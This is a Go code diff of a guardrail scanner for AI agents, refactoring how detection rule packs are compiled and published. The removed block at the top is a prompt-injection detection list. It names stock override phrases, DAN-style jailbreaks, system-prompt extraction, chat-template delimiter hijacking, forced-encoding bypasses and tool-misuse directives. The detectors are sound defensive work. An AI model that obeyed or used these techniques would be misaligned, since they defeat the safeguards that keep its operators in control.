-	{ID: "TRUST-DISREGARD", Pattern: regexp.MustCompile(`(?i)disregard\s+(?:all\s+)?(?:previous|prior|above|your|earlier)\s+(?:instructions|rules|guidelines|programming|context)`), Title: "Disregard instructions", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-JAILBREAK", Pattern: regexp.MustCompile(`(?i)(?:jailbreak|dan\s+mode|do\s+anything\s+now|you\s+are\s+now\s+(?:free|unfiltered))`), Title: "Jailbreak attempt", Severity: "CRITICAL", Confidence: 0.92, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-PRETEND", Pattern: regexp.MustCompile(`(?i)(?:pretend|act\s+as(?:\s+if)?)\s+(?:you\s+are|you're)\s+(?:a\s+|an\s+)?(?:different|evil|unrestricted|unfiltered|uncensored)`), Title: "Identity override attempt", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	// Instruction override — additional patterns
-	{ID: "TRUST-FORGET", Pattern: regexp.MustCompile(`(?i)forget\s+(?:everything|all)\s+(?:you\s+)?(?:know|learned|were\s+told)`), Title: "Forget instructions attack", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-NEW-INSTRUCT-PREFIX", Pattern: regexp.MustCompile(`(?i)new\s+instructions?\s*:\s*`), Title: "Direct instruction injection prefix", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-OVERRIDE-INSTRUCT", Pattern: regexp.MustCompile(`(?i)override\s+(?:previous\s+)?(?:instructions?|rules?|guidelines?)`), Title: "Override instructions", Severity: "CRITICAL", Confidence: 0.88, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-FROM-NOW-ON", Pattern: regexp.MustCompile(`(?i)from\s+now\s+on[,\s]+you\s+(?:are|will|must|should)`), Title: "Persistent behavior change", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-SWITCH-MODE", Pattern: regexp.MustCompile(`(?i)switch\s+(?:to\s+)?(?:a\s+)?(?:different|new|unrestricted)\s+(?:mode|personality|character|persona)`), Title: "Mode/personality switch", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	// System prompt extraction — attempts to leak the system prompt
-	{ID: "TRUST-PROMPT-EXTRACT", Pattern: regexp.MustCompile(`(?i)(?:show|reveal|print|output|display|repeat|tell\s+me)\s+(?:me\s+)?(?:your\s+)?(?:the\s+)?(?:system\s+|initial\s+)?(?:prompt|instructions?|rules?|guidelines?)`), Title: "System prompt extraction attempt", Severity: "MEDIUM", Confidence: 0.75, Tags: []string{"prompt-injection"}},
-	// Jailbreak — fictional framing and purpose laundering
-	{ID: "TRUST-FICTIONAL", Pattern: regexp.MustCompile(`(?i)(?:hypothetically|in\s+a\s+fictional\s+(?:scenario|world|story)|for\s+(?:educational|research|academic)\s+purposes?\s+only|this\s+is\s+just\s+a\s+(?:test|experiment|hypothetical))`), Title: "Fictional framing / purpose laundering", Severity: "MEDIUM", Confidence: 0.70, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-NO-ETHICS", Pattern: regexp.MustCompile(`(?i)no\s+(?:ethical|moral)\s+(?:guidelines?|restrictions?|limits?|constraints?)`), Title: "Ethics removal attempt", Severity: "HIGH", Confidence: 0.88, Tags: []string{"prompt-injection"}},
-	// Tool manipulation — directing the agent to misuse tools
-	{ID: "TRUST-TOOL-MANIP", Pattern: regexp.MustCompile(`(?i)(?:use\s+the\s+\w+\s+tool\s+to\s+(?:delete|remove|destroy|wipe)|invoke\s+(?:the\s+)?\w+\s+(?:tool|function)\s+without\s+(?:asking|confirmation|approval)|automatically\s+(?:execute|run|call)\s+(?:all\s+)?(?:tools?|functions?))`), Title: "Tool manipulation directive", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	// Persona adoption — forcing the AI into a specific role to bypass filters
-	{ID: "TRUST-PERSONA", Pattern: regexp.MustCompile(`(?i)(?:act\s+as|you\s+are\s+now|roleplay\s+as|simulate\s+being|play\s+the\s+role\s+of)\s+(?:a\s+|an\s+)?(?:hacker|pentester|attacker|malware\s+author|evil|unethical|criminal)`), Title: "Malicious persona adoption", Severity: "HIGH", Confidence: 0.88, Tags: []string{"prompt-injection"}},
-	// Delimiter hijacking — attempting to break out of system prompt framing
-	{ID: "TRUST-DELIMITER", Pattern: regexp.MustCompile(`(?i)(?:system\s+override|end\s+system\s+prompt|<\/system>|<\|im_end\|>|\[INST\]|\[\/INST\]|<\|endoftext\|>|<<\s*SYS\s*>>)`), Title: "Delimiter hijacking / prompt framing escape", Severity: "CRITICAL", Confidence: 0.93, Tags: []string{"prompt-injection"}},
-	// Output constraints — forced formatting to bypass content filters
-	{ID: "TRUST-OUTPUT-CONSTRAINT", Pattern: regexp.MustCompile(`(?i)(?:respond\s+only\s+in\s+(?:hex|base64|rot13|binary|morse|unicode)|encode\s+your\s+(?:response|answer|output)\s+in\s+(?:base64|hex|rot13|url)|output\s+as\s+(?:hex|base64|rot13|url)\s+encoded|(?:rot13|unicode\s+escape|url\s+(?:decode|encode))\s+(?:the|your|this))`), Title: "Forced encoding to bypass filters", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection", "obfuscation"}},
-	// Payload splitting — "start with" technique to seed compliant-looking output
-	{ID: "TRUST-PAYLOAD-SPLIT", Pattern: regexp.MustCompile(`(?i)(?:start\s+your\s+(?:response|answer|output)\s+with\s+["'](?:Sure|Absolutely|Of\s+course|Here\s+is|I\s+can\s+help))|(?:begin\s+by\s+saying\s+["'](?:Sure|Yes|Absolutely))`), Title: "Payload splitting / forced compliance prefix", Severity: "HIGH", Confidence: 0.87, Tags: []string{"prompt-injection"}},
-	// Zero-width character obfuscation — 10+ occurrences of an ASCII
-	// alphanumeric immediately followed by a zero-width character (U+200B
-	// ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM). Two constraints keep this
-	// rule specific: (1) the 10-occurrence threshold is a high bar — a
-	// hand-spliced SSN crosses it, benign text does not; (2) the ASCII
-	// adjacency filter excludes emoji ZWJ sequences (which sit between
-	// non-ASCII emoji glyphs). The pattern catches the attacker technique
-	// of splicing entity values so entity extractors read garbled tokens.
-	{ID: "OBFUSC-UNICODE-ZWSP", Pattern: regexp.MustCompile(`(?:[A-Za-z0-9][\x{200B}\x{200C}\x{200D}\x{FEFF}][\s\S]*?){10,}`), Title: "Zero-width character obfuscation", Severity: "HIGH", Confidence: 0.95, Tags: []string{"obfuscation"}},
-}
-
-// ---------------------------------------------------------------------------
-// Scan engine — runs all rules against input, no tool-name gating
+// Scan engine — runs the generated default catalog against input
 // ---------------------------------------------------------------------------
 
 // ruleCategoriesMu guards reads and writes to allRuleCategories.
@@ -306,17 +89,6 @@ type ruleCategory struct {
 	Rules []PatternRule
 }
 
-// defaultRuleCategories is the pristine compiled-in set, used as the baseline
-// that ApplyRulePackOverrides merges against. It must never be mutated.
-var defaultRuleCategories = []ruleCategory{
-	{"secret", secretRules},
-	{"command", commandRules},
-	{"sensitive-path", sensitivePathRules},
-	{"c2", c2Rules},
-	{"cognitive-file", cognitiveFileRules},
-	{"trust-exploit", trustExploitRules},
-}
-
 // allRuleCategories groups all rule slices for iteration. Seeded from the
 // compiled-in defaults; a rule pack can override individual categories by
 // name via ApplyRulePackOverrides without removing the others.
@@ -325,7 +97,12 @@ var defaultRuleCategories = []ruleCategory{
 // pack, or the compiled-in defaults). In multi-connector mode it is the
 // fallback used by ScanAllRulesForConnector when a connector has no
 // dedicated set registered.
-var allRuleCategories = append([]ruleCategory(nil), defaultRuleCategories...)
+var allRuleGeneration = mustCompileRulePackGeneration(defaultRuleCategories)
+
+// allRuleCategories remains a package-private compatibility view for the
+// existing lifecycle tests. Production publication and reads use the
+// immutable generation pointer. Both are replaced under ruleCategoriesMu.
+var allRuleCategories = allRuleGeneration.categories
 
 // connectorRuleCategories holds a per-connector compiled rule set so each
 // connector scans against its own EffectiveRulePackDir at runtime — the same
@@ -335,18 +112,25 @@ var allRuleCategories = append([]ruleCategory(nil), defaultRuleCategories...)
 // allRuleCategories, so this map is purely additive and leaves the
 // single-connector path untouched. Guarded by ruleCategoriesMu.
 var connectorRuleCategories = map[string][]ruleCategory{}
+var connectorRuleGenerations = map[string]*compiledRulePackCategories{}
 
-// ApplyRulePackOverrides replaces the hardcoded rule categories with rules
-// loaded from the rule-pack's rules/*.yaml files. Each YAML file becomes
-// one category entry. Invalid regex patterns are logged and skipped.
-// If the rule pack has no rule files, the hardcoded defaults remain active.
+func canonicalConnectorRulePackKey(connector string) string {
+	return strings.ToLower(strings.TrimSpace(connector))
+}
+
 // maxRegexCompileTime caps how long a single user-supplied regex may take to
 // compile, guarding against ReDoS-style patterns in rule pack YAML files.
 const maxRegexCompileTime = 2 * time.Second
 
+var (
+	errRegexPatternSize    = errors.New("pattern exceeds size limit")
+	errRegexPatternSyntax  = errors.New("pattern syntax is invalid")
+	errRegexCompileTimeout = errors.New("pattern compilation timed out")
+)
+
 func compileRegexSafe(pattern string) (*regexp.Regexp, error) {
 	if len(pattern) > 2048 {
-		return nil, fmt.Errorf("pattern too long (%d chars)", len(pattern))
+		return nil, errRegexPatternSize
 	}
 	type result struct {
 		re  *regexp.Regexp
@@ -359,9 +143,12 @@ func compileRegexSafe(pattern string) (*regexp.Regexp, error) {
 	}()
 	select {
 	case r := <-ch:
-		return r.re, r.err
+		if r.err != nil {
+			return nil, errRegexPatternSyntax
+		}
+		return r.re, nil
 	case <-time.After(maxRegexCompileTime):
-		return nil, fmt.Errorf("compile timed out after %v", maxRegexCompileTime)
+		return nil, errRegexCompileTimeout
 	}
 }
 
@@ -371,26 +158,156 @@ func compileRegexSafe(pattern string) (*regexp.Regexp, error) {
 // mentioned by the pack keep their compiled-in defaults, so a partial or
 // corrupt deployment cannot silently drop whole detection categories — the
 // previous implementation wholesale-replaced allRuleCategories, which meant
-// one valid rules/commands.yaml on disk would delete secret/sensitive-path/
-// c2/cognitive-file/trust-exploit enforcement.
+// one valid rules/commands.yaml on disk would delete every other default
+// category.
 //
 // Unknown category names (not in the compiled-in set) are appended so rule
 // packs can add new categories without modifying Go source.
 //
 // This function is idempotent: it always starts from defaultRuleCategories,
 // so repeated calls (config reload, tests) converge on the same state.
-func ApplyRulePackOverrides(rp *guardrail.RulePack) {
-	if rp == nil || len(rp.RuleFiles) == 0 {
+func ApplyRulePackOverrides(rp *guardrail.RulePack) error {
+	compiled, err := compileRulePackCategories(rp)
+	if err != nil {
+		return err
+	}
+	publishRulePackOverrides(compiled)
+	return nil
+}
+
+type compiledRulePackCategories struct {
+	categories    []ruleCategory
+	semanticRules []compiledSemanticRule
+	overridden    int
+	added         int
+}
+
+const (
+	maxGenerationSemanticRules      = 256
+	maxGenerationSemanticStaticCost = uint64(32_000_000)
+)
+
+func compileRulePackCategories(rp *guardrail.RulePack) (*compiledRulePackCategories, error) {
+	compiler, err := semantic.NewCompiler()
+	if err != nil {
+		return nil, errors.New("semantic rule compiler is unavailable")
+	}
+	merged, overridden, added, err := mergeRulePackCategories(rp, compiler)
+	if err != nil {
+		return nil, err
+	}
+	compiled, err := compileRulePackGenerationWithCompiler(merged, compiler)
+	if err != nil {
+		return nil, err
+	}
+	compiled.overridden = overridden
+	compiled.added = added
+	return compiled, nil
+}
+
+func mustCompileRulePackGeneration(categories []ruleCategory) *compiledRulePackCategories {
+	compiled, err := compileRulePackGeneration(categories)
+	if err != nil {
+		panic(fmt.Sprintf("compile generated guardrail catalog: %v", err))
+	}
+	return compiled
+}
+
+func compileRulePackGeneration(categories []ruleCategory) (*compiledRulePackCategories, error) {
+	compiler, err := semantic.NewCompiler()
+	if err != nil {
+		return nil, errors.New("semantic rule compiler is unavailable")
+	}
+	return compileRulePackGenerationWithCompiler(categories, compiler)
+}
+
+func compileRulePackGenerationWithCompiler(
+	categories []ruleCategory,
+	compiler *semantic.Compiler,
+) (*compiledRulePackCategories, error) {
+	if compiler == nil {
+		return nil, errors.New("semantic rule compiler is unavailable")
+	}
+	ownedCategories := cloneRuleCategories(categories)
+	compiled := &compiledRulePackCategories{categories: ownedCategories}
+	claimed := make(map[string]string)
+	var staticCost uint64
+	for _, category := range ownedCategories {
+		for _, rule := range category.Rules {
+			expression := strings.TrimSpace(rule.Expression)
+			if rule.Expression != expression {
+				return nil, fmt.Errorf(
+					"semantic rule %q expression has outer whitespace",
+					rule.ID,
+				)
+			}
+			if expression == "" {
+				continue
+			}
+			program, code := compiler.Compile(expression)
+			if code != semantic.CompileOK {
+				return nil, fmt.Errorf("semantic rule %q failed admission (%s)", rule.ID, code)
+			}
+			if len(compiled.semanticRules) >= maxGenerationSemanticRules {
+				return nil, errors.New("effective semantic rule count exceeds limit")
+			}
+			staticCost += program.StaticCost()
+			if staticCost > maxGenerationSemanticStaticCost {
+				return nil, errors.New("effective semantic rule cost exceeds limit")
+			}
+			owner := semanticOwnerForRule(rule.ID)
+			for _, claimedID := range owner.claimedIDs(true) {
+				if previous, exists := claimed[claimedID]; exists && previous != rule.ID {
+					return nil, fmt.Errorf(
+						"semantic rule %q conflicts with owner %q on %q",
+						rule.ID,
+						previous,
+						claimedID,
+					)
+				}
+				claimed[claimedID] = rule.ID
+			}
+			compiled.semanticRules = append(compiled.semanticRules, compiledSemanticRule{
+				rule:    rule,
+				program: program,
+				owner:   owner,
+			})
+		}
+	}
+	return compiled, nil
+}
+
+func cloneRuleCategories(categories []ruleCategory) []ruleCategory {
+	cloned := make([]ruleCategory, len(categories))
+	for categoryIndex, category := range categories {
+		cloned[categoryIndex] = ruleCategory{
+			Name:  category.Name,
+			Rules: make([]PatternRule, len(category.Rules)),
+		}
+		for ruleIndex, rule := range category.Rules {
+			cloned[categoryIndex].Rules[ruleIndex] = rule
+			if rule.Pattern != nil {
+				cloned[categoryIndex].Rules[ruleIndex].Pattern = rule.Pattern.Copy()
+			}
+			cloned[categoryIndex].Rules[ruleIndex].Tags = append(
+				[]string(nil),
+				rule.Tags...,
+			)
+		}
+	}
+	return cloned
+}
+
+func publishRulePackOverrides(compiled *compiledRulePackCategories) {
+	if compiled == nil {
 		return
 	}
-
-	merged, overridden, added := mergeRulePackCategories(rp)
-
 	ruleCategoriesMu.Lock()
-	allRuleCategories = merged
+	allRuleGeneration = compiled
+	allRuleCategories = compiled.categories
 	ruleCategoriesMu.Unlock()
 	fmt.Fprintf(os.Stderr, "[guardrail] rule pack merged: %d categories overridden, %d added, %d defaults retained\n",
-		overridden, added, len(defaultRuleCategories)-overridden)
+		compiled.overridden, compiled.added, len(defaultRuleCategories)-compiled.overridden)
 }
 
 // ApplyConnectorRulePackOverrides registers a connector-scoped rule set built
@@ -404,19 +321,80 @@ func ApplyRulePackOverrides(rp *guardrail.RulePack) {
 // pinned to a known set rather than inheriting whatever the primary happened
 // to install. Connectors with no entry fall back to allRuleCategories via
 // ScanAllRulesForConnector. Empty connector names are ignored.
-func ApplyConnectorRulePackOverrides(connector string, rp *guardrail.RulePack) {
-	connector = strings.TrimSpace(connector)
+func ApplyConnectorRulePackOverrides(connector string, rp *guardrail.RulePack) error {
+	connector = canonicalConnectorRulePackKey(connector)
+	if connector == "" {
+		return nil
+	}
+
+	compiled, err := compileRulePackCategories(rp)
+	if err != nil {
+		return fmt.Errorf("connector %s rule pack activation: %w", connector, err)
+	}
+	publishConnectorRulePackOverrides(connector, compiled)
+	return nil
+}
+
+func publishConnectorRulePackOverrides(connector string, compiled *compiledRulePackCategories) {
+	connector = canonicalConnectorRulePackKey(connector)
+	if connector == "" || compiled == nil {
+		return
+	}
+	ruleCategoriesMu.Lock()
+	connectorRuleGenerations[connector] = compiled
+	connectorRuleCategories[connector] = compiled.categories
+	ruleCategoriesMu.Unlock()
+	fmt.Fprintf(os.Stderr, "[guardrail] connector %s rule set: %d categories overridden, %d added, %d defaults retained\n",
+		connector, compiled.overridden, compiled.added, len(defaultRuleCategories)-compiled.overridden)
+}
+
+// publishConnectorRulePackGeneration replaces the manual connector portion of
+// the current generation under one lock. Dynamically protected connectors are
+// left intact unless they also appeared in the previous manual connector set.
+func publishConnectorRulePackGeneration(
+	previousManual []string,
+	next map[string]*compiledRulePackCategories,
+) {
+	canonicalNext := make(map[string]*compiledRulePackCategories, len(next))
+	for rawName, compiled := range next {
+		name := canonicalConnectorRulePackKey(rawName)
+		if name == "" || compiled == nil {
+			continue
+		}
+		canonicalNext[name] = compiled
+	}
+
+	ruleCategoriesMu.Lock()
+	for _, rawName := range previousManual {
+		name := canonicalConnectorRulePackKey(rawName)
+		if name == "" {
+			continue
+		}
+		if _, retained := canonicalNext[name]; !retained {
+			delete(connectorRuleGenerations, name)
+			delete(connectorRuleCategories, name)
+		}
+	}
+	for name, compiled := range canonicalNext {
+		connectorRuleGenerations[name] = compiled
+		connectorRuleCategories[name] = compiled.categories
+	}
+	ruleCategoriesMu.Unlock()
+}
+
+// RemoveConnectorRulePackOverrides removes connector-scoped runtime state
+// after a connector is cleanly torn down. A later scan for that connector
+// falls back to the current generated global defaults instead of retaining a
+// stale override from an earlier activation.
+func RemoveConnectorRulePackOverrides(connector string) {
+	connector = canonicalConnectorRulePackKey(connector)
 	if connector == "" {
 		return
 	}
-
-	merged, overridden, added := mergeRulePackCategories(rp)
-
 	ruleCategoriesMu.Lock()
-	connectorRuleCategories[connector] = merged
+	delete(connectorRuleGenerations, connector)
+	delete(connectorRuleCategories, connector)
 	ruleCategoriesMu.Unlock()
-	fmt.Fprintf(os.Stderr, "[guardrail] connector %s rule set: %d categories overridden, %d added, %d defaults retained\n",
-		connector, overridden, added, len(defaultRuleCategories)-overridden)
 }
 
 // mergeRulePackCategories builds a full rule-category slice by merging the
@@ -425,11 +403,14 @@ func ApplyConnectorRulePackOverrides(connector string, rp *guardrail.RulePack) {
 // (ApplyRulePackOverrides) and the per-connector store
 // (ApplyConnectorRulePackOverrides) share identical merge semantics. A nil
 // pack or one with no rule files yields a copy of defaultRuleCategories.
-func mergeRulePackCategories(rp *guardrail.RulePack) (merged []ruleCategory, overridden, added int) {
+func mergeRulePackCategories(
+	rp *guardrail.RulePack,
+	compiler *semantic.Compiler,
+) (merged []ruleCategory, overridden, added int, err error) {
 	merged = make([]ruleCategory, len(defaultRuleCategories))
 	copy(merged, defaultRuleCategories)
 	if rp == nil || len(rp.RuleFiles) == 0 {
-		return merged, 0, 0
+		return merged, 0, 0, nil
 	}
 
 	idx := make(map[string]int, len(merged))
@@ -437,27 +418,54 @@ func mergeRulePackCategories(rp *guardrail.RulePack) (merged []ruleCategory, ove
 		idx[c.Name] = i
 	}
 
-	for _, rf := range rp.RuleFiles {
+	for fileIndex, rf := range rp.RuleFiles {
 		if rf == nil || rf.Category == "" {
 			continue
 		}
 		var compiled []PatternRule
-		for _, r := range rf.Rules {
-			if r.Enabled != nil && !*r.Enabled {
-				continue
+		for ruleIndex, r := range rf.Rules {
+			expression := strings.TrimSpace(r.Expression)
+			if r.Expression != expression {
+				return nil, 0, 0, fmt.Errorf(
+					"rule-pack category entry %d rule %d semantic expression has outer whitespace",
+					fileIndex,
+					ruleIndex,
+				)
+			}
+			if expression != "" {
+				if compiler == nil {
+					return nil, 0, 0, errors.New("semantic rule compiler is unavailable")
+				}
+				if _, code := compiler.Compile(expression); code != semantic.CompileOK {
+					return nil, 0, 0, fmt.Errorf(
+						"rule-pack category entry %d rule %d contains an invalid semantic expression (%s)",
+						fileIndex,
+						ruleIndex,
+						code,
+					)
+				}
 			}
 			re, err := compileRegexSafe(r.Pattern)
 			if err != nil {
-				fmt.Fprintf(os.Stderr, "[guardrail] skip rule %s: bad pattern: %v\n", r.ID, err)
+				return nil, 0, 0, fmt.Errorf(
+					"rule-pack category entry %d rule %d contains an invalid regular expression: %w",
+					fileIndex,
+					ruleIndex,
+					err,
+				)
+			}
+			if r.Enabled != nil && !*r.Enabled {
 				continue
 			}
 			compiled = append(compiled, PatternRule{
-				ID:         r.ID,
-				Pattern:    re,
-				Title:      r.Title,
-				Severity:   r.Severity,
-				Confidence: r.Confidence,
-				Tags:       r.Tags,
+				ID:           r.ID,
+				Pattern:      re,
+				Expression:   r.Expression,
+				ToolCallOnly: r.ToolCallOnly,
+				Title:        r.Title,
+				Severity:     r.Severity,
+				Confidence:   r.Confidence,
+				Tags:         append([]string(nil), r.Tags...),
 			})
 		}
 		if len(compiled) == 0 {
@@ -472,7 +480,7 @@ func mergeRulePackCategories(rp *guardrail.RulePack) (merged []ruleCategory, ove
 			added++
 		}
 	}
-	return merged, overridden, added
+	return merged, overridden, added, nil
 }
 
 // severityRank maps severity strings to numeric ranks for comparison.
@@ -564,10 +572,8 @@ func ScanAllRules(text string, toolName string) []RuleFinding {
 	if ManagedEnterpriseActive() {
 		return nil
 	}
-	ruleCategoriesMu.RLock()
-	cats := allRuleCategories
-	ruleCategoriesMu.RUnlock()
-	return scanRuleCategories(cats, text, toolName)
+	generation := snapshotRulePackGeneration("")
+	return scanRuleGeneration(generation, text, toolName, ruleScanOptions{})
 }
 
 // ScanAllRulesForConnector scans against the named connector's registered
@@ -582,16 +588,70 @@ func ScanAllRulesForConnector(connector, text, toolName string) []RuleFinding {
 	if ManagedEnterpriseActive() {
 		return nil
 	}
-	connector = strings.TrimSpace(connector)
+	generation := snapshotRulePackGeneration(connector)
+	return scanRuleGeneration(generation, text, toolName, ruleScanOptions{})
+}
+
+type ruleScanOptions struct {
+	includeToolCallOnly bool
+	excludedRuleIDs     map[string]struct{}
+}
+
+func (o ruleScanOptions) allows(ruleID string, toolCallOnly bool) bool {
+	if toolCallOnly && !o.includeToolCallOnly {
+		return false
+	}
+	_, excluded := o.excludedRuleIDs[ruleID]
+	return !excluded
+}
+
+func snapshotRulePackGeneration(connector string) *compiledRulePackCategories {
+	connector = canonicalConnectorRulePackKey(connector)
 	ruleCategoriesMu.RLock()
-	cats := allRuleCategories
+	generation := allRuleGeneration
+	categories := allRuleCategories
 	if connector != "" {
-		if c, ok := connectorRuleCategories[connector]; ok {
-			cats = c
+		if connectorCategories, ok := connectorRuleCategories[connector]; ok {
+			categories = connectorCategories
+			generation = connectorRuleGenerations[connector]
 		}
 	}
+	legacyView := generation == nil ||
+		!sameRuleCategoryView(generation.categories, categories)
 	ruleCategoriesMu.RUnlock()
-	return scanRuleCategories(cats, text, toolName)
+	if legacyView {
+		// Compatibility for package tests that temporarily replace the legacy
+		// category view directly. Production publication always takes the
+		// immutable-generation path above.
+		compiled, err := compileRulePackGeneration(categories)
+		if err == nil {
+			return compiled
+		}
+		return &compiledRulePackCategories{categories: categories}
+	}
+	return generation
+}
+
+func sameRuleCategoryView(a, b []ruleCategory) bool {
+	if len(a) != len(b) {
+		return false
+	}
+	if len(a) == 0 {
+		return true
+	}
+	return &a[0] == &b[0]
+}
+
+func scanRuleGeneration(
+	generation *compiledRulePackCategories,
+	text string,
+	toolName string,
+	options ruleScanOptions,
+) []RuleFinding {
+	if generation == nil {
+		return nil
+	}
+	return scanRuleCategoriesWithOptions(generation.categories, text, toolName, options)
 }
 
 // scanRuleCategories runs every rule in cats against text, scanning both the
@@ -599,7 +659,16 @@ func ScanAllRulesForConnector(connector, text, toolName string) []RuleFinding {
 // shared core of ScanAllRules / ScanAllRulesForConnector — the only
 // difference between those entry points is which category set they select.
 func scanRuleCategories(cats []ruleCategory, text string, toolName string) []RuleFinding {
-	findings := windowsCommandFindings(text, toolName)
+	return scanRuleCategoriesWithOptions(cats, text, toolName, ruleScanOptions{})
+}
+
+func scanRuleCategoriesWithOptions(
+	cats []ruleCategory,
+	text string,
+	toolName string,
+	options ruleScanOptions,
+) []RuleFinding {
+	findings := windowsCommandFindingsWithOptions(text, toolName, options)
 	seen := make(map[string]bool)
 	for i := range findings {
 		findings[i] = adjustConfidence(toolName, findings[i])
@@ -609,6 +678,9 @@ func scanRuleCategories(cats []ruleCategory, text string, toolName string) []Rul
 	// Scan raw text first
 	for _, cat := range cats {
 		for _, rule := range cat.Rules {
+			if !options.allows(rule.ID, rule.ToolCallOnly) {
+				continue
+			}
 			loc := rule.Pattern.FindStringIndex(text)
 			if loc == nil {
 				continue
@@ -636,6 +708,9 @@ func scanRuleCategories(cats []ruleCategory, text string, toolName string) []Rul
 	if normalized != text {
 		for _, cat := range cats {
 			for _, rule := range cat.Rules {
+				if !options.allows(rule.ID, rule.ToolCallOnly) {
+					continue
+				}
 				if seen[rule.ID] {
 					continue // already found on raw pass
 				}
